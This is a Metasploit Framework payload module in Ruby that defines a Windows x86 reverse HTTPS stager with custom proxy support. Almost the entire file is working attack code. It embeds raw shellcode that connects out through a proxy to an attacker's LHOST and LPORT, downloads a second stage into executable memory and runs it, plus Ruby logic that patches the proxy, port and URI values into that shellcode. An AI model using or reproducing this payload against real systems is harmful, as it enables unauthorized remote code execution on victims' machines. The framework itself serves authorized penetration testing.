##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/reverse_https_proxy'


module Metasploit3

	include Msf::Payload::Stager
	include Msf::Payload::Windows

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Reverse HTTPS Stager with support for custom proxy',
			'Version'       => '$Revision$',
			'Description'   => 'Tunnel communication over HTTP using SSL, supports custom proxy',
			'Author'        => ['hdm','corelanc0d3r <peter.ve@corelan.be>'],
			'License'       => MSF_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::ReverseHttpsProxy,
			'Convention'    => 'sockedi https',
			'Stager'        =>
				{
					'Payload' =>
						"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
						"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
						"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
						"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
						"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
						"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
						"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
						"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
						"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
						"\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07" +
						"\xff\xd5\xe8\x0f\x00\x00\x00\x50\x52\x4f\x58\x59\x48\x4f\x53\x54" +
						"\x3a\x50\x4f\x52\x54\x00\x59\x31\xff\x57\x54\x51\x6a\x03\x6a\x00" +
						"\x68\x3a\x56\x79\xa7\xff\xd5\xeb\x62\x5b\x31\xc9\x51\x51\x6a" +
						"\x03\x51\x51\x68\x5c\x11\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff" +
						"\xd5\xe9\x4b\x00\x00\x00\x59\x31\xd2\x52\x68\x00\x32\xa0\x84\x52" +
						"\x52\x52\x51\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x6a\x10" +
						"\x5b\x68\x80\x33\x00\x00\x89\xe0\x6a\x04\x50\x6a\x1f\x56\x68\x75" +
						"\x46\x9e\x86\xff\xd5\x31\xff\x57\x57\x57\x57\x56\x68\x2d\x06\x18" +
						"\x7b\xff\xd5\x85\xc0\x75\x1d\x4b\x74\x13\xeb\xd5\xe9\x49\x00\x00" +
						"\x00\xe8\xb0\xff\xff\xff\x2f\x31\x32\x33\x34\x35\x00\x68\xf0\xb5" +
						"\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00" +
						"\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89\xe7\x57\x68\x00" +
						"\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcd" +
						"\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\x4b\xff\xff\xff"
				}
			))

		# Register proxy options
		register_options(
			[
				OptAddress.new('PROXYHOST', [true, "The IP address of the proxy to use" ,"127.0.0.1"]),
				OptInt.new('PROXYPORT', [ false, "The Proxy port to connect to", 8080 ])
			], self.class)

	end

	#
	# Do not transmit the stage over the connection.  We handle this via HTTPS
	#
	def stage_over_connection?
		false
	end

	#
	# Generate the first stage
	#
	def generate
		p = super

		i = p.index("/12345\x00")
		u = "/" + generate_uri_checksum(Msf::Handler::ReverseHttpsProxy::URI_CHECKSUM_INITW) + "\x00"
		p[i, u.length] = u
		
		# patch proxy info	
		proxyhost = datastore['PROXYHOST'].to_s
		proxyport = datastore['PROXYPORT'].to_s || "8080"
		proxyinfo = proxyhost + ":" + proxyport
		if proxyport == "80"
			proxyinfo = proxyhost
		end

		proxyloc = p.index("PROXYHOST:PORT")
		p = p.gsub("PROXYHOST:PORT",proxyinfo)

		# patch the call
		calloffset = proxyinfo.length
		calloffset += 1
		p[proxyloc-4] = [calloffset].pack('V')[0]

		# patch the LPORT
		lportloc = p.index("\x68\x5c\x11\x00\x00")  # PUSH DWORD 4444
		p[lportloc+1] = [datastore['LPORT'].to_i].pack('V')[0]
		p[lportloc+2] = [datastore['LPORT'].to_i].pack('V')[1]
		p[lportloc+3] = [datastore['LPORT'].to_i].pack('V')[2]
		p[lportloc+4] = [datastore['LPORT'].to_i].pack('V')[3]

		# append LHOST and return payload
		p + datastore['LHOST'].to_s + "\x00"

	end

	#
	# Always wait at least 20 seconds for this payload (due to staging delays)
	#
	def wfs_delay
		20
	end
end
